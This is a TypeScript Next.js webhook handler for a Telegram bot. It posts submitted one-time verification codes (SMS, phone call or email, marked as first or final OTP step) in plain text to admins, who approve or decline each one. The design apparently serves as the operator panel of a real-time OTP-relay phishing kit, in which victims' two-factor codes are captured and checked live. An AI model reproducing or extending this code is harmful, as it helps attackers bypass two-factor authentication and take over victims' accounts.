import { NextResponse } from "next/server";
import { z } from "zod";
import { isAdmin } from "@/lib/telegram-admin";
import {
  approvePendingCode,
  declinePendingCode,
  getPendingCode,
  updatePendingCode,
} from "@/lib/pending-codes";
import {
  answerCallbackQuery,
  editTelegramMessage,
} from "@/lib/telegram";

/**
 * Telegram Webhook Handler
 * Receives callback queries when admins click approve/decline buttons
 * 
 * Set webhook with: https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://your-domain.com/api/telegram/webhook
 */

const callbackQuerySchema = z.object({
  update_id: z.number(),
  callback_query: z.object({
    id: z.string(),
    from: z.object({
      id: z.number(),
      username: z.string().optional(),
      first_name: z.string().optional(),
    }),
    message: z.object({
      message_id: z.number(),
      chat: z.object({
        id: z.number(),
      }),
    }),
    data: z.string(),
  }),
});

export async function POST(request: Request) {
  try {
    const json = (await request.json()) as unknown;
    const parsed = callbackQuerySchema.safeParse(json);

    if (!parsed.success) {
      console.log("[Telegram Webhook] Ignoring non-callback update");
      return NextResponse.json({ ok: true });
    }

    const update = parsed.data;
    const callbackQuery = update.callback_query;
    const userId = callbackQuery.from.id;
    const username = callbackQuery.from.username || callbackQuery.from.first_name || String(userId);
    const messageId = callbackQuery.message.message_id;
    const chatId = String(callbackQuery.message.chat.id);
    const callbackData = callbackQuery.data;

    // Check if user is admin
    if (!isAdmin(userId)) {
      await answerCallbackQuery(
        callbackQuery.id,
        "❌ You don't have admin privileges",
        true,
      );
      return NextResponse.json({ ok: true });
    }

    // Parse callback data
    const [action, codeId] = callbackData.split("_") as [string, string];

    if (!codeId) {
      await answerCallbackQuery(
        callbackQuery.id,
        "❌ Invalid callback data",
        true,
      );
      return NextResponse.json({ ok: true });
    }

    // Get the pending code
    const pendingCode = getPendingCode(codeId);
    if (!pendingCode) {
      await answerCallbackQuery(
        callbackQuery.id,
        "❌ Code not found or expired",
        true,
      );
      return NextResponse.json({ ok: true });
    }

    // Check if code is already processed
    if (pendingCode.status !== "pending") {
      await answerCallbackQuery(
        callbackQuery.id,
        `❌ Code already ${pendingCode.status}`,
        true,
      );
      return NextResponse.json({ ok: true });
    }

    // Process action
    let updated;
    let statusEmoji = "";
    let statusText = "";

    if (action === "approve") {
      updated = approvePendingCode(codeId, username);
      statusEmoji = "✅";
      statusText = "APPROVED";
    } else if (action === "decline") {
      updated = declinePendingCode(codeId, username);
      statusEmoji = "❌";
      statusText = "DECLINED";
    } else {
      await answerCallbackQuery(
        callbackQuery.id,
        "❌ Unknown action",
        true,
      );
      return NextResponse.json({ ok: true });
    }

    if (!updated) {
      await answerCallbackQuery(
        callbackQuery.id,
        "❌ Failed to update code status",
        true,
      );
      return NextResponse.json({ ok: true });
    }

    // Update the message with the new status
    const newText = `✅ Verification Code Submitted
🔐 Type: ${pendingCode.method === "text" ? "Text Message (SMS)" : pendingCode.method === "phone" ? "Phone Call" : "Email"}
🧩 OTP Step: ${pendingCode.otpStep === 2 ? "Final" : "First"}
🔢 Code: ${pendingCode.code}

━━━━━━━━━━━━━━━━━━
${statusEmoji} Status: ${statusText}
👤 By: ${username}
⏰ Time: ${new Date().toISOString()}`;

    // Update message to show approval/decline
    const buttons = [
      [
        {
          text: statusEmoji + " " + statusText,
          callback_data: "noop",
        },
      ],
    ];

    await editTelegramMessage(messageId, newText, buttons, chatId);

    // Send notification callback response
    await answerCallbackQuery(
      callbackQuery.id,
      `✅ Code ${statusText.toLowerCase()}`,
      false,
    );

    console.log(
      `[Telegram Webhook] Admin ${username} (${userId}) ${action}ed code ${pendingCode.code}`,
    );

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error("[Telegram Webhook] Error:", error);
    return NextResponse.json(
      { ok: false, error: String(error) },
      { status: 500 },
    );
  }
}

/**
 * Handle webhook setup/health check
 */
export async function GET(request: Request) {
  const url = new URL(request.url);

  if (url.searchParams.has("setup")) {
    return NextResponse.json({
      message: "To setup webhook, run this command with your bot token:",
      command: "curl https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook?url=https://your-domain.com/api/telegram/webhook",
    });
  }

  return NextResponse.json({ ok: true, webhook: "ready" });
}
